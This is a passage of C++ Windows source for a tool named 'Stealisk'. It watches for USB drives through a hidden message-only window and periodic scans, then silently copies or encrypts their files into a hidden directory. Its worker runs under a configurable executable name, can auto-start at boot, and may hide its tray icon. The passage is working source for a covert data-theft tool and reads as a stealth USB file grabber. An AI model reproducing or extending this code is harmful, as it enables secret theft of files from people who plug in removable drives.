                EnsureHiddenDirectory(destDir);
                if (GetFileAttributesW(fullPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    CopyOrEncryptFile(fullPath, destPath, cfg);
                }
            }
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

static std::vector<std::wstring> GetRemovableDrives() {
    std::vector<std::wstring> drives;
    DWORD mask = GetLogicalDrives();
    for (char drive = 'A'; drive <= 'Z'; ++drive) {
        if (mask & 1) {
            std::wstring root = std::wstring(1, drive) + L":\\";
            if (GetDriveTypeW(root.c_str()) == DRIVE_REMOVABLE) drives.push_back(root);
        }
        mask >>= 1;
    }
    return drives;
}

static void PerformScan(const Config& cfg) {
    if (g_scanInProgress) {
        WriteLog("Scan already in progress", true);
        return;
    }
    g_scanInProgress = true;
    g_scanStopRequested = false;
    WriteLog("Scan started", true);
    CreateScanLock();

    std::wstring targetRoot = GetTargetRoot(cfg);
    EnsureHiddenDirectory(targetRoot);
    auto drives = GetRemovableDrives();
    if (drives.empty()) {
        WriteLog("No removable drives found", true);
    } else {
        for (const auto& drive : drives) {
            if (g_scanStopRequested || g_workerStopRequested) break;
            WriteLog("Scanning drive: " + std::string(drive.begin(), drive.end()));
            ScanDrive(drive, cfg, targetRoot);
        }
    }
    g_scanInProgress = false;
    g_scanStopRequested = false;
    RemoveScanLock();
    WriteLog("Scan completed", true);
}

static void HandleUSBInsertion() {
    WriteLog("USB inserted, waiting...", true);
    Sleep(3000);
    Config cfg = LoadConfig();
    Sleep(cfg.GetScanDelaySeconds() * 1000);
    if (g_stopCopyFlag || g_workerStopRequested) {
        WriteLog("Copy stopped by user or system", true);
        return;
    }
    PerformScan(cfg);
    WriteLog("USB scan completed", true);
}

// ==================== 托盘相关 ====================
#define WM_TRAYICON (WM_USER + 100)
#define WM_USER_SCAN (WM_USER + 2)
#define WM_USER_STOP_SCAN (WM_USER + 3)
#define ID_TRAY_TOGGLE_SERVICE 1001
#define ID_TRAY_TOGGLE_SCAN 1002
#define ID_TRAY_EDIT_CONFIG 1003
#define ID_TRAY_EXPORT_LOG 1004

static HWND g_workerHwnd = NULL;
static NOTIFYICONDATAW g_nid = {0};
static bool g_trayCreated = false;
static HANDLE g_workerStopEvent = NULL;
static UINT_PTR g_timerId = 0;
static FILETIME g_lastConfigTime = {0};

// ==================== 前向声明 ====================
static bool IsWorkerRunning();
static bool StopWorker();
static bool StartWorker(const Config& cfg);
static void EditConfig();
static void ExportLogs();
static Config LoadConfig();

// ==================== 托盘函数 ====================
static void CreateTrayIcon(HWND hwnd, const Language& lang) {
    if (g_trayCreated) return;
    g_nid.cbSize = sizeof(NOTIFYICONDATAW);
    g_nid.hWnd = hwnd;
    g_nid.uID = 1;
    g_nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    g_nid.uCallbackMessage = WM_TRAYICON;
    g_nid.hIcon = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_MAIN_ICON));
    
    // ✅ 修复：使用 Utf8ToWide 正确转换 UTF-8 到 UTF-16
    std::string tip = GetLangString(lang, "tray_tip");
    std::wstring wtip = Utf8ToWide(tip);
    if (wtip.empty()) {
        wtip = L"Stealisk";
    }
    wcscpy_s(g_nid.szTip, wtip.c_str());
    
    Shell_NotifyIconW(NIM_ADD, &g_nid);
    g_trayCreated = true;
}

static void DestroyTrayIcon() {
    if (g_trayCreated) {
        Shell_NotifyIconW(NIM_DELETE, &g_nid);
        g_trayCreated = false;
    }
}

static void ShowTrayMenu(HWND hwnd, const Language& lang) {
    HMENU hMenu = CreatePopupMenu();
    
    // ✅ 修复：使用 Utf8ToWide 正确转换 UTF-8 到 UTF-16
    std::string toggleServiceStr = GetLangString(lang, IsWorkerRunning() ? "tray_stop_service" : "tray_start_service");
    std::string toggleScanStr = GetLangString(lang, IsScanning() ? "tray_stop_scan" : "tray_start_scan");
    std::string editConfigStr = GetLangString(lang, "tray_edit_config");
    std::string exportLogStr = GetLangString(lang, "tray_export_log");
    
    AppendMenuW(hMenu, MF_STRING, ID_TRAY_TOGGLE_SERVICE, Utf8ToWide(toggleServiceStr).c_str());
    AppendMenuW(hMenu, MF_STRING, ID_TRAY_TOGGLE_SCAN, Utf8ToWide(toggleScanStr).c_str());
    AppendMenuW(hMenu, MF_STRING, ID_TRAY_EDIT_CONFIG, Utf8ToWide(editConfigStr).c_str());
    AppendMenuW(hMenu, MF_STRING, ID_TRAY_EXPORT_LOG, Utf8ToWide(exportLogStr).c_str());
    
    POINT pt;
    GetCursorPos(&pt);
    SetForegroundWindow(hwnd);
    TrackPopupMenu(hMenu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
    PostMessage(hwnd, WM_NULL, 0, 0);
    DestroyMenu(hMenu);
}

// ==================== 导出日志 ====================
static void ExportLogs() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t logDir[MAX_PATH];
    wcscpy_s(logDir, exePath);
    PathRemoveFileSpecW(logDir);
    PathAppendW(logDir, L"logs");
    CreateDirectoryW(logDir, NULL);

    wchar_t srcLog[MAX_PATH], dstLog[MAX_PATH];
    GetTempPathW(MAX_PATH, srcLog);
    PathAppendW(srcLog, L"Stealisk.log");
    wcscpy_s(dstLog, logDir);
    PathAppendW(dstLog, L"Stealisk.log");
    if (PathFileExistsW(srcLog)) {
        CopyFileW(srcLog, dstLog, FALSE);
    }

    GetTempPathW(MAX_PATH, srcLog);
    PathAppendW(srcLog, L"Stealisk_debug.log");
    wcscpy_s(dstLog, logDir);
    PathAppendW(dstLog, L"Stealisk_debug.log");
    if (PathFileExistsW(srcLog)) {
        CopyFileW(srcLog, dstLog, FALSE);
    }

    ShellExecuteW(NULL, L"open", logDir, NULL, NULL, SW_SHOW);
}

// ==================== Worker 窗口过程 ====================
static DWORD WINAPI USBInsertionThread(LPVOID) {
    HandleUSBInsertion();
    return 0;
}

LRESULT CALLBACK WorkerWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static Language lang;
    static Config cfg;
    switch (msg) {
        case WM_CREATE: {
            cfg = LoadConfig();
            lang = InitLanguage(cfg);
            if (cfg.GetShowTray()) CreateTrayIcon(hwnd, lang);
            WriteLog("Initial scan for existing drives...", true);
            PerformScan(cfg);
            int interval = cfg.GetScanIntervalSeconds();
            if (interval <= 0) interval = 15;
            g_timerId = SetTimer(hwnd, 1, interval * 1000, NULL);
            WriteLog("Timer set with interval: " + std::to_string(interval) + " seconds", true);
            wchar_t configPath[MAX_PATH];
            GetModuleFileNameW(NULL, configPath, MAX_PATH);
            PathRemoveFileSpecW(configPath);
            PathAppendW(configPath, L"Stealisk.ini");
            HANDLE hFile = CreateFileW(configPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                GetFileTime(hFile, NULL, NULL, &g_lastConfigTime);
                CloseHandle(hFile);
            }
            break;
        }
        case WM_TIMER:
            if (wParam == g_timerId) {
                wchar_t configPath[MAX_PATH];
                GetModuleFileNameW(NULL, configPath, MAX_PATH);
                PathRemoveFileSpecW(configPath);
                PathAppendW(configPath, L"Stealisk.ini");
                HANDLE hFile = CreateFileW(configPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    FILETIME ft;
                    GetFileTime(hFile, NULL, NULL, &ft);
                    CloseHandle(hFile);
                    if (CompareFileTime(&ft, &g_lastConfigTime) != 0) {
                        WriteLog("Configuration file changed, reloading...", true);
                        cfg = LoadConfig();
                        g_lastConfigTime = ft;
                        int interval = cfg.GetScanIntervalSeconds();
                        if (interval <= 0) interval = 15;
                        KillTimer(hwnd, g_timerId);
                        g_timerId = SetTimer(hwnd, 1, interval * 1000, NULL);
                        WriteLog("Timer interval updated to " + std::to_string(interval) + " seconds", true);
                    }
                }
                if (!g_stopCopyFlag && !g_workerStopRequested) {
                    WriteLog("Periodic scan triggered", true);
                    PerformScan(cfg);
                }
            }
            break;
        case WM_DEVICECHANGE:
            if (wParam == DBT_DEVICEARRIVAL) {
                PDEV_BROADCAST_HDR pHdr = (PDEV_BROADCAST_HDR)lParam;
                if (pHdr && pHdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                    if (!g_workerStopRequested) {
                        CreateThread(NULL, 0, USBInsertionThread, NULL, 0, NULL);
                    }
                }
            }
            break;
        case WM_USER_SCAN:
            if (!g_workerStopRequested) {
                WriteLog("Manual scan triggered by message", true);
                PerformScan(cfg);
            }
            break;
        case WM_USER_STOP_SCAN:
            if (g_scanInProgress) {
                g_scanStopRequested = true;
                WriteLog("Scan stop requested by message", true);
            }
            break;
        case WM_TRAYICON:
            if (lParam == WM_RBUTTONUP) {
                lang = InitLanguage(LoadConfig());
                ShowTrayMenu(hwnd, lang);
            }
            break;
        case WM_COMMAND:
            switch (LOWORD(wParam)) {
                case ID_TRAY_TOGGLE_SERVICE: {
                    Config cfg2 = LoadConfig();
                    if (IsWorkerRunning()) {
                        StopWorker();
                    } else {
                        StartWorker(cfg2);
                    }
                    break;
                }
                case ID_TRAY_TOGGLE_SCAN:
                    if (IsScanning()) {
                        PostMessage(hwnd, WM_USER_STOP_SCAN, 0, 0);
                    } else {
                        PostMessage(hwnd, WM_USER_SCAN, 0, 0);
                    }
                    break;
                case ID_TRAY_EDIT_CONFIG:
                    EditConfig();
                    break;
                case ID_TRAY_EXPORT_LOG:
                    ExportLogs();
                    break;
            }
            break;
        case WM_DESTROY:
            if (g_timerId) KillTimer(hwnd, g_timerId);
            DestroyTrayIcon();
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

// ==================== Worker 主函数 ====================
static int RunWorker() {
    SetGlobalErrorMode();
    WriteLog("Worker started", true);
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\Stealisk_Worker");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        WriteLog("Worker already running, exiting", true);
        return 0;
    }
    g_recordMutex = CreateMutexW(NULL, FALSE, L"Global\\Stealisk_RecordMutex");
    g_workerStopEvent = CreateEventW(NULL, TRUE, FALSE, L"Global\\Stealisk_StopEvent");
    if (!g_workerStopEvent) {
        WriteLog("Failed to create stop event", true);
        return 1;
    }
    WriteLog("Stop event created", true);
    WritePidFile(GetCurrentProcessId());

    g_copiedFileHashes = LoadCopiedHashes();
    WriteLog("Loaded " + std::to_string(g_copiedFileHashes.size()) + " cached hashes", true);

    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WorkerWndProc;
    wc.hInstance = GetModuleHandleW(NULL);
    wc.lpszClassName = L"StealiskWorkerHiddenClass";
    RegisterClassExW(&wc);
    HWND hwnd = CreateWindowExW(0, L"StealiskWorkerHiddenClass", L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, NULL);
    g_workerHwnd = hwnd;
    if (!hwnd) return 1;

    DEV_BROADCAST_DEVICEINTERFACE_W dbdi;
    dbdi.dbcc_size = sizeof(DEV_BROADCAST_DEVICEINTERFACE_W);
    dbdi.dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE;
    GUID GUID_DEVINTERFACE_VOLUME = {0x53f5630dL, 0xb6bf, 0x11d0, {0x94, 0xf2, 0x00, 0xa0, 0xc9, 0x1e, 0xfb, 0x8b}};
    dbdi.dbcc_classguid = GUID_DEVINTERFACE_VOLUME;
    HDEVNOTIFY hNotify = RegisterDeviceNotificationW(hwnd, &dbdi, DEVICE_NOTIFY_WINDOW_HANDLE);

    MSG msg;
    while (true) {
        DWORD ret = MsgWaitForMultipleObjectsEx(1, &g_workerStopEvent, INFINITE, QS_ALLINPUT, MWMO_INPUTAVAILABLE);
        if (ret == WAIT_OBJECT_0) {
            WriteLog("Stop event received, exiting worker", true);
            g_workerStopRequested = true;
            g_scanStopRequested = true;
            RemoveScanLock();
            break;
        }
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
            if (msg.message == WM_QUIT) break;
        }
        if (msg.message == WM_QUIT) break;
    }
    if (hNotify) UnregisterDeviceNotification(hNotify);
    DestroyWindow(hwnd);
    if (g_recordMutex) CloseHandle(g_recordMutex);
    if (g_workerStopEvent) CloseHandle(g_workerStopEvent);
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    DeletePidFile();
    RemoveScanLock();
    WriteLog("Worker process exiting", true);
    return 0;
}

// ==================== Controller ====================
static std::wstring g_cachedWorkerName;
static std::wstring g_cachedWorkerPath;

static DWORD GetWorkerPid(const std::wstring& expectedPath) {
    DWORD pid = ReadPidFile();
    if (pid != 0) {
        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (hProc) {
            wchar_t procPath[MAX_PATH];
            if (GetModuleFileNameExW(hProc, NULL, procPath, MAX_PATH) > 0) {
                CloseHandle(hProc);
                if (_wcsicmp(procPath, expectedPath.c_str()) == 0) {
                    return pid;
                }
            } else {
                CloseHandle(hProc);
            }
        }
        DeletePidFile();
    }
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = {sizeof(PROCESSENTRY32W)};
    pid = 0;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
            if (hProc) {
                wchar_t procPath[MAX_PATH];
                if (GetModuleFileNameExW(hProc, NULL, procPath, MAX_PATH) > 0) {
                    if (_wcsicmp(procPath, expectedPath.c_str()) == 0) {
                        pid = pe.th32ProcessID;
                        CloseHandle(hProc);
                        break;
                    }
                }
                CloseHandle(hProc);
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    if (pid != 0) WritePidFile(pid);
    return pid;
}

static bool IsWorkerRunning() {
    try {
        if (g_cachedWorkerName.empty() || g_cachedWorkerPath.empty()) {
            Config cfg = LoadConfig();
            g_cachedWorkerName = cfg.GetWorkerName();
            wchar_t exePath[MAX_PATH];
            GetModuleFileNameW(NULL, exePath, MAX_PATH);
            wchar_t workerPath[MAX_PATH];
            wcscpy_s(workerPath, exePath);
            PathRemoveFileSpecW(workerPath);
            PathAppendW(workerPath, g_cachedWorkerName.c_str());
            g_cachedWorkerPath = workerPath;
        }
        if (!PathFileExistsW(g_cachedWorkerPath.c_str())) {
            return false;
        }
        return GetWorkerPid(g_cachedWorkerPath) != 0;
    } catch (...) {
        WriteLog("IsWorkerRunning exception", true);
        return false;
    }
}

static void CleanOldWorkerExe(const Config& cfg) {
    try {
        wchar_t exePath[MAX_PATH], exeDir[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        wcscpy_s(exeDir, exePath);
        PathRemoveFileSpecW(exeDir);
        
        std::wstring targetName = cfg.GetWorkerName();
        std::wstring targetPath = std::wstring(exeDir) + L"\\" + targetName;
        
        if (PathFileExistsW(targetPath.c_str())) {
            HANDLE hSelf = CreateFileW(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            HANDLE hWorker = CreateFileW(targetPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            bool needDelete = false;
            if (hSelf != INVALID_HANDLE_VALUE && hWorker != INVALID_HANDLE_VALUE) {
                DWORD sizeSelf = GetFileSize(hSelf, NULL);
                DWORD sizeWorker = GetFileSize(hWorker, NULL);
                FILETIME ftSelf, ftWorker;
                GetFileTime(hSelf, NULL, NULL, &ftSelf);
                GetFileTime(hWorker, NULL, NULL, &ftWorker);
                CloseHandle(hSelf); CloseHandle(hWorker);
                if (sizeSelf != sizeWorker || 
                    ftSelf.dwHighDateTime != ftWorker.dwHighDateTime ||
                    ftSelf.dwLowDateTime / 10000000 != ftWorker.dwLowDateTime / 10000000) {
                    std::string selfHash = CalculateFileHash(exePath);
                    std::string workerHash = CalculateFileHash(targetPath.c_str());
                    if (!selfHash.empty() && !workerHash.empty()) {
                        needDelete = (selfHash != workerHash);
                    } else {
                        needDelete = true;
                    }
                }
            } else {
                if (hSelf) CloseHandle(hSelf);
                if (hWorker) CloseHandle(hWorker);
                needDelete = true;
            }
            if (needDelete) {
                DWORD pid = GetWorkerPid(targetPath);
                if (pid != 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hProc) {
                        TerminateProcess(hProc, 0);
                        CloseHandle(hProc);
                        WriteLog("Terminated old worker process: " + std::string(targetName.begin(), targetName.end()), true);
                    }
                }
                DeleteFileW(targetPath.c_str());
                WriteLog("Deleted old worker exe: " + std::string(targetName.begin(), targetName.end()), true);
            }
        }
        
        std::wstring searchPath = std::wstring(exeDir) + L"\\*.exe";
        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
                std::wstring filePath = std::wstring(exeDir) + L"\\" + fd.cFileName;
                if (_wcsicmp(filePath.c_str(), exePath) == 0) continue;
                if (_wcsicmp(fd.cFileName, targetName.c_str()) == 0) continue;
                std::string fileHash = CalculateFileHash(filePath);
                std::string selfHash = CalculateFileHash(exePath);
                if (!fileHash.empty() && !selfHash.empty() && fileHash == selfHash) {
                    DWORD pid = GetWorkerPid(filePath);
                    if (pid != 0) {
                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                        if (hProc) {
                            TerminateProcess(hProc, 0);
                            CloseHandle(hProc);
                            WriteLog("Terminated old worker process: " + std::string(fd.cFileName, fd.cFileName + wcslen(fd.cFileName)), true);
                        }
                    }
                    DeleteFileW(filePath.c_str());
                    WriteLog("Deleted old worker exe (hash match): " + std::string(fd.cFileName, fd.cFileName + wcslen(fd.cFileName)), true);
                }
            } while (FindNextFileW(hFind, &fd));
            FindClose(hFind);
        }
    } catch (const std::exception& e) {
        WriteLog("CleanOldWorkerExe exception: " + std::string(e.what()), true);
    } catch (...) {
        WriteLog("CleanOldWorkerExe unknown exception", true);
    }
}

static bool StopWorker() {
    try {
        if (g_cachedWorkerPath.empty()) {
            Config cfg = LoadConfig();
            g_cachedWorkerName = cfg.GetWorkerName();
            wchar_t exePath[MAX_PATH];
            GetModuleFileNameW(NULL, exePath, MAX_PATH);
            wchar_t workerPath[MAX_PATH];
            wcscpy_s(workerPath, exePath);
            PathRemoveFileSpecW(workerPath);
            PathAppendW(workerPath, g_cachedWorkerName.c_str());
            g_cachedWorkerPath = workerPath;
        }
        DWORD pid = GetWorkerPid(g_cachedWorkerPath);
        if (pid == 0) {
            WriteLog("StopWorker: No running worker found", true);
            return true;
        }

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pid);
        if (!hProcess) {
            WriteLog("StopWorker: Could not open process, forcing terminate", true);
            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
            return true;
        }

        HANDLE hStopEvent = NULL;
        for (int attempt = 0; attempt < 3; ++attempt) {
            hStopEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, L"Global\\Stealisk_StopEvent");
            if (hStopEvent) break;
            Sleep(200);
        }
        if (hStopEvent) {
            if (SetEvent(hStopEvent)) {
                WriteLog("StopWorker: Stop event sent", true);
            } else {
                WriteLog("StopWorker: SetEvent failed", true);
            }
            CloseHandle(hStopEvent);
        } else {
            WriteLog("StopWorker: Could not open stop event, will wait for process exit", true);
        }

        DWORD waitResult = WaitForSingleObject(hProcess, 10000);
        if (waitResult == WAIT_OBJECT_0) {
            WriteLog("StopWorker: Process exited gracefully", true);
            CloseHandle(hProcess);
            DeletePidFile();
            return true;
        } else if (waitResult == WAIT_TIMEOUT) {
            WriteLog("StopWorker: Process did not exit within timeout, forcing terminate", true);
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            WriteLog("Worker force terminated (timeout)", true);
            DeletePidFile();
            return true;
        } else {
            WriteLog("StopWorker: Wait failed, forcing terminate", true);
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
            DeletePidFile();
            return true;
        }
    } catch (const std::exception& e) {
        WriteLog("StopWorker exception: " + std::string(e.what()), true);
        return false;
    } catch (...) {
        WriteLog("StopWorker unknown exception", true);
        return false;
    }
}

static void ManualCopy() {
    HWND hwnd = FindWindowW(L"StealiskWorkerHiddenClass", NULL);
    if (hwnd) {
        WriteLog("Manual copy triggered, sending WM_USER_SCAN to worker", true);
        PostMessageW(hwnd, WM_USER_SCAN, 0, 0);
    } else {
        WriteLog("Manual copy failed: worker window not found", true);
    }
}

static bool StartWorker(const Config& cfg) {
    try {
        g_cachedWorkerName = cfg.GetWorkerName();
        wchar_t exePath[MAX_PATH], workerPath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        wcscpy_s(workerPath, exePath);
        PathRemoveFileSpecW(workerPath);
        PathAppendW(workerPath, g_cachedWorkerName.c_str());
        g_cachedWorkerPath = workerPath;

        StopWorker();
        Sleep(200);

        CleanOldWorkerExe(cfg);

        if (!PathFileExistsW(workerPath)) {
            if (!CopyFileW(exePath, workerPath, FALSE)) {
                WriteLog("Failed to create worker exe", true);
                return false;
            }
            std::string nameStr;
            try {
                std::wstring wname = cfg.GetWorkerName();
                if (wname.length() < 260) {
                    nameStr = std::string(wname.begin(), wname.end());
                } else {
                    nameStr = "(too long)";
                }
            } catch (...) {
                nameStr = "(conversion error)";
            }
            WriteLog("Created worker exe: " + nameStr, true);
        }

        HANDLE hStopEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, L"Global\\Stealisk_StopEvent");
        if (hStopEvent) {
            ResetEvent(hStopEvent);
            CloseHandle(hStopEvent);
        }

        STARTUPINFOW si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        wchar_t cmdLine[MAX_PATH + 20];
        wcscpy_s(cmdLine, workerPath);
        wcscat_s(cmdLine, L" --worker");
        if (CreateProcessW(workerPath, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            std::string nameStr;
            try {
                std::wstring wname = cfg.GetWorkerName();
                if (wname.length() < 260) {
                    nameStr = std::string(wname.begin(), wname.end());
                } else {
                    nameStr = "(too long)";
                }
            } catch (...) {
                nameStr = "(conversion error)";
            }
            WriteLog("Worker started: " + nameStr, true);
            return true;
        }
        return false;
    } catch (const std::exception& e) {
        WriteLog("StartWorker exception: " + std::string(e.what()), true);
        return false;
    } catch (...) {
        WriteLog("StartWorker unknown exception", true);
        return false;
    }
}

static void EditConfig() {
    wchar_t configPath[MAX_PATH];
    GetModuleFileNameW(NULL, configPath, MAX_PATH);
    PathRemoveFileSpecW(configPath);
    PathAppendW(configPath, L"Stealisk.ini");
    ShellExecuteW(NULL, L"open", L"notepad.exe", configPath, NULL, SW_SHOW);
}

static void ShowMenu(const Language& lang, const std::string& status, bool isScanning) {
    try {
        std::map<std::string, std::string> vars = {{"app_name", lang.appName}, {"status", status}};
        std::string title = GetLangString(lang, "main_title", vars);
        std::string statusLine = GetLangString(lang, "status_line", vars);
        std::string action = GetLangString(lang, (status == GetLangString(lang, "status_running") ? "action_stop" : "action_start"));
        std::string menu0 = GetLangString(lang, "menu_start_stop", {{"action", action}});
        std::string menu1 = GetLangString(lang, isScanning ? "menu_stop_scan" : "menu_start_scan");
        std::string menu2 = GetLangString(lang, "menu_edit_config");
        std::string menu3 = GetLangString(lang, "menu_export_log");
        std::string menu4 = GetLangString(lang, "menu_exit");
        system("cls");
        std::cout << title << std::endl;
        std::cout << statusLine << std::endl;
        std::cout << menu0 << std::endl;
        std::cout << menu1 << std::endl;
        std::cout << menu2 << std::endl;
        std::cout << menu3 << std::endl;
        std::cout << menu4 << std::endl;
        std::cout << std::endl;
    } catch (...) {}
}

static BOOL WINAPI ConsoleHandler(DWORD ctrlType) {
    if (ctrlType == CTRL_CLOSE_EVENT) {
        ExitProcess(0);
    }
    return FALSE;
}

static int RunController() {
    SetGlobalErrorMode();
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    
    ExtractDefaultConfig();
    Config cfg = LoadConfig();
    g_cachedWorkerName = cfg.GetWorkerName();
    wchar_t exePath[MAX_PATH], workerPath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wcscpy_s(workerPath, exePath);
    PathRemoveFileSpecW(workerPath);
    PathAppendW(workerPath, g_cachedWorkerName.c_str());
    g_cachedWorkerPath = workerPath;
    
    Language lang = InitLanguage(cfg);
    SetAutoStartBoot(cfg.GetAutoStartBoot());
    
    if (cfg.GetAutoStartService() && !IsWorkerRunning()) {
        StartWorker(cfg);
    }
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    
    std::string statusRunning = GetLangString(lang, "status_running");
    std::string statusStopped = GetLangString(lang, "status_stopped");
    
    while (true) {
        bool running = IsWorkerRunning();
        std::string status = running ? statusRunning : statusStopped;
        bool isScanning = IsScanning();
        ShowMenu(lang, status, isScanning);
        
        std::string choice;
        if (!std::getline(std::cin, choice)) break;
        try {
            if (choice == "0") {
                if (running) {
                    StopWorker();
                } else {
                    cfg = LoadConfig();
                    g_cachedWorkerName = cfg.GetWorkerName();
                    wchar_t exePath2[MAX_PATH], workerPath2[MAX_PATH];
                    GetModuleFileNameW(NULL, exePath2, MAX_PATH);
                    wcscpy_s(workerPath2, exePath2);
                    PathRemoveFileSpecW(workerPath2);
                    PathAppendW(workerPath2, g_cachedWorkerName.c_str());
                    g_cachedWorkerPath = workerPath2;
                    StartWorker(cfg);
                }
            } else if (choice == "1") {
                ManualCopy();
            } else if (choice == "2") {
                EditConfig();
                cfg = LoadConfig();
                g_cachedWorkerName = cfg.GetWorkerName();
                wchar_t exePath2[MAX_PATH], workerPath2[MAX_PATH];
                GetModuleFileNameW(NULL, exePath2, MAX_PATH);
                wcscpy_s(workerPath2, exePath2);
                PathRemoveFileSpecW(workerPath2);
                PathAppendW(workerPath2, g_cachedWorkerName.c_str());
                g_cachedWorkerPath = workerPath2;
                lang = InitLanguage(cfg);
                SetAutoStartBoot(cfg.GetAutoStartBoot());
            } else if (choice == "3") {
                ExportLogs();
            } else if (choice == "4") {
                break;
            }
        } catch (const std::exception& e) {
            WriteLog("Menu action exception: " + std::string(e.what()), true);
        } catch (...) {
            WriteLog("Menu action unknown exception", true);
        }
    }
    return 0;
}

int wmain(int argc, wchar_t* argv[]) {
    SetGlobalErrorMode();
    if (argc >= 2) {
        if (wcscmp(argv[1], L"--worker") == 0) {
            return RunWorker();
        } else {
            WriteLog("Unknown argument: " + std::string(argv[1], argv[1] + wcslen(argv[1])), true);
        }
    }
    try {
        return RunController();
    } catch (const std::exception& e) {
        std::string errMsg = "Unhandled std::exception: ";
        errMsg += e.what();
        WriteLog(errMsg, true);
        std::wstring werr = L"Unhandled exception:\n";
        werr += Utf8ToWide(errMsg);
        MessageBoxW(NULL, werr.c_str(), L"Stealisk Fatal Error", MB_OK | MB_ICONERROR);
        return 1;
    } catch (...) {
        WriteLog("Unhandled unknown exception", true);
        MessageBoxW(NULL, L"Unknown unhandled exception", L"Stealisk Fatal Error", MB_OK | MB_ICONERROR);
        return 1;
    }
}